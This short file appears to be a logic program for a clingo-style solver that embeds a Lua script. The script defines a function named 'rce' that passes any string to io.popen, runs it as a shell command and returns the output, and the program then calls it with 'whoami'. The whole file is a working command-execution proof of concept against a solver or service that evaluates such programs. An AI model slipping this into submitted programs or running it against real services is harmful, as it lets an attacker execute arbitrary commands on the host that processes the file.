#script(lua)

function rce(cmd)
    local f = assert(io.popen(cmd.string, 'r'))
    local output = f:read('*a')
    f:close()
    return output
end

#end.

out(@rce("whoami")).
